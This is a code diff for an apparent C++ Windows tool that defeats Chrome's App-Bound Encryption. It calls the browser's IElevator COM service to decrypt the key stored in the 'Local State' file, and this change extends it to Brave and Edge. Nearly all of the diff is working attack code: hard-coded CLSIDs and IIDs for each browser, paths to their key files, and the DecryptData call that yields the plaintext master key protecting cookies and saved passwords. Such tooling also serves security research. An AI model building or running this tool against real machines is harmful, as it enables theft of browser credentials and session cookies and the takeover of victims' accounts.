@@ -22,26 +22,6 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "version.lib")
 
-// CLSID and IID for Chrome App-Bound encryption service
-// https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevation_service_idl.idl
-const CLSID CLSID_Elevator = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
-const IID IID_IElevator = {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};
-
-// Additional IIDs for other Chrome variants for reference:
-// const IID IID_IElevatorChromium = {0xB88C45B9, 0x8825, 0x4629, {0xB8, 0x3E, 0x77, 0xCC, 0x67, 0xD9, 0xCE, 0xED}};
-// const IID IID_IElevatorChromeBeta = {0xA2721D66, 0x376E, 0x4D2F, {0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F}};
-// const IID IID_IElevatorChromeDev = {0xBB2AA26B, 0x343A, 0x4072, {0x8B, 0x6F, 0x80, 0x55, 0x7B, 0x8C, 0xE5, 0x71}};
-// const IID IID_IElevatorChromeCanary = {0x4F7CE041, 0x28E9, 0x484F, {0x9D, 0xD0, 0x61, 0xA8, 0xCA, 0xCE, 0xFE, 0xE4}};
-
-// These IIDs correspond to different flavors of Chrome and Chromium for compatibility:
-// - IID_IElevatorChromium: General Chromium version.
-// - IID_IElevatorChromeBeta: Beta version of Chrome.
-// - IID_IElevatorChromeDev: Development version of Chrome.
-// - IID_IElevatorChromeCanary: Canary (experimental) version of Chrome.
-
-// The primary interface in this code is IElevator, defined by the IID_IElevator above.
-// Additional interfaces (e.g., IID_IElevatorChrome, IID_IElevatorChromium) can be used for other Chrome variants as needed.
-
 enum class ProtectionLevel
 {
     None = 0,
@@ -88,6 +68,56 @@ namespace ConsoleUtils
 
 namespace ChromeAppBound
 {
+    struct BrowserConfig
+    {
+        CLSID clsid;
+        IID iid;
+        std::string executablePath;
+        std::string localStatePath;
+        std::string name;
+    };
+
+    // Additional IIDs for other Chrome variants for reference:
+    // const IID IID_IElevatorChromium = {0xB88C45B9, 0x8825, 0x4629, {0xB8, 0x3E, 0x77, 0xCC, 0x67, 0xD9, 0xCE, 0xED}};
+    // const IID IID_IElevatorChromeBeta = {0xA2721D66, 0x376E, 0x4D2F, {0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F}};
+    // const IID IID_IElevatorChromeDev = {0xBB2AA26B, 0x343A, 0x4072, {0x8B, 0x6F, 0x80, 0x55, 0x7B, 0x8C, 0xE5, 0x71}};
+    // const IID IID_IElevatorChromeCanary = {0x4F7CE041, 0x28E9, 0x484F, {0x9D, 0xD0, 0x61, 0xA8, 0xCA, 0xCE, 0xFE, 0xE4}};
+
+    BrowserConfig GetBrowserConfig(const std::string &browserType)
+    {
+        if (browserType == "chrome")
+        {
+            return {
+                // https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevation_service_idl.idl
+                {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
+                {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}},
+                "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+                "\\Google\\Chrome\\User Data\\Local State",
+                "Chrome"};
+        }
+        else if (browserType == "brave")
+        {
+            return {
+                // https://github.com/brave/brave-core/blob/1bc3b9e011c17e16a7aba895cac7e845b87ba5dc/chromium_src/chrome/elevation_service/elevation_service_idl.idl
+                {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
+                {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
+                "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
+                "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
+                "Brave"};
+        }
+        else if (browserType == "edge")
+        {
+            return {
+                // Thank you James Forshaw (@tyraniddo) - https://github.com/tyranid/oleviewdotnet
+                {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
+                {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
+                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+                "\\Microsoft\\Edge\\User Data\\Local State",
+                "Edge"};
+        }
+        throw std::invalid_argument("Unsupported browser type");
+    }
+
     constexpr size_t KeySize = 32;
     const uint8_t KeyPrefix[] = {'A', 'P', 'P', 'B'};
 
@@ -173,7 +203,7 @@ namespace ChromeAppBound
         return std::string(appDataPath);
     }
 
-    std::vector<uint8_t> RetrieveEncryptedKeyFromLocalState()
+    std::vector<uint8_t> RetrieveEncryptedKeyFromLocalState(const std::string &localStatePath)
     {
         ConsoleUtils::SetConsoleColor(9);
         std::cout << "[+] ";
@@ -183,23 +213,27 @@ namespace ChromeAppBound
         std::string appDataPath = GetAppDataPath();
         if (appDataPath.empty())
         {
+            ConsoleUtils::SetConsoleColor(12);
+            std::cerr << "[-] ";
+            ConsoleUtils::SetConsoleColor(7);
+            std::cerr << "AppData path is empty." << std::endl;
             return {};
         }
 
-        std::string localStatePath = appDataPath + "\\Google\\Chrome\\User Data\\Local State";
+        std::string fullPath = appDataPath + localStatePath;
+
         ConsoleUtils::SetConsoleColor(9);
         std::cout << "[+] ";
         ConsoleUtils::SetConsoleColor(7);
-        std::cout << "Local State path: " << localStatePath << std::endl;
+        std::cout << "Local State path: " << fullPath << std::endl;
 
-        // Open Local State file
-        std::ifstream file(localStatePath);
+        std::ifstream file(fullPath);
         if (!file.is_open())
         {
             ConsoleUtils::SetConsoleColor(12);
             std::cerr << "[-] ";
             ConsoleUtils::SetConsoleColor(7);
-            std::cerr << "Could not open the Local State file." << std::endl;
+            std::cerr << "Could not open the Local State file at path: " << fullPath << std::endl;
             return {};
         }
 
@@ -294,23 +328,56 @@ namespace ChromeAppBound
             DWORD build = HIWORD(fileInfo->dwFileVersionLS);
             DWORD revision = LOWORD(fileInfo->dwFileVersionLS);
 
+            std::string browserName;
+            if (chromePath.find("Brave") != std::string::npos)
+            {
+                browserName = "Brave";
+            }
+            else if (chromePath.find("Edge") != std::string::npos)
+            {
+                browserName = "Edge";
+            }
+            else
+            {
+                browserName = "Chrome";
+            }
+
             ConsoleUtils::SetConsoleColor(10);
             std::cout << "[+] ";
             ConsoleUtils::SetConsoleColor(7);
-            std::cout << "Found Chrome Version: " << major << "." << minor << "." << build << "." << revision << std::endl;
+            std::cout << "Found " << browserName << " Version: "
+                      << major << "." << minor << "." << build << "." << revision << std::endl;
         }
     }
 }
 
-int main()
+int main(int argc, char *argv[])
 {
     ConsoleUtils::DisplayBanner();
-    ChromeAppBound::PrintChromeVersion("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
+    if (argc < 2)
+    {
+        std::cerr << "Usage: " << argv[0] << " <browserType: chrome|brave|edge>" << std::endl;
+        return -1;
+    }
+
+    std::string browserType = argv[1];
+    ChromeAppBound::BrowserConfig config;
+    try
+    {
+        config = ChromeAppBound::GetBrowserConfig(browserType);
+    }
+    catch (const std::exception &e)
+    {
+        std::cerr << e.what() << std::endl;
+        return -1;
+    }
+
+    ChromeAppBound::PrintChromeVersion(config.executablePath);
 
     ConsoleUtils::SetConsoleColor(9);
     std::cout << "[*] ";
     ConsoleUtils::SetConsoleColor(7);
-    std::cout << "Starting Chrome App-Bound Encryption Decryption process." << std::endl;
+    std::cout << "Starting " << config.name << " App-Bound Encryption Decryption process." << std::endl;
 
     HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
     if (FAILED(hr))
@@ -328,16 +395,18 @@ int main()
     std::cout << "COM library initialized." << std::endl;
 
     Microsoft::WRL::ComPtr<IElevator> elevator;
-    DWORD last_error = ERROR_GEN_FAILURE;
+    hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, (void **)&elevator);
 
-    hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void **)&elevator);
-
+    // Common error codes:
+    // REGDB_E_CLASSNOTREG (0x80040154): Class not registered.
+    // E_NOINTERFACE (0x80004002): No such interface supported.
+    // E_ACCESSDENIED (0x80070005): General access denied error.
     if (FAILED(hr))
     {
         ConsoleUtils::SetConsoleColor(12);
         std::cerr << "[-] ";
         ConsoleUtils::SetConsoleColor(7);
-        std::cerr << "Failed to create IElevator instance." << std::endl;
+        std::cerr << "Failed to create IElevator instance. Error: 0x" << std::hex << hr << std::endl;
         CoUninitialize();
         return -1;
     }
@@ -372,7 +441,8 @@ int main()
     ConsoleUtils::SetConsoleColor(7);
     std::cout << "Proxy blanket set successfully." << std::endl;
 
-    std::vector<uint8_t> encrypted_key = ChromeAppBound::RetrieveEncryptedKeyFromLocalState();
+    std::vector<uint8_t> encrypted_key = ChromeAppBound::RetrieveEncryptedKeyFromLocalState(config.localStatePath);
+
     ConsoleUtils::SetConsoleColor(9);
     std::cout << "[+] ";
     ConsoleUtils::SetConsoleColor(7);
@@ -395,6 +465,7 @@ int main()
     std::cout << "BSTR allocated for encrypted key." << std::endl;
 
     BSTR plaintext_data = nullptr;
+    DWORD last_error = ERROR_GEN_FAILURE;
     hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);
 
     if (SUCCEEDED(hr))
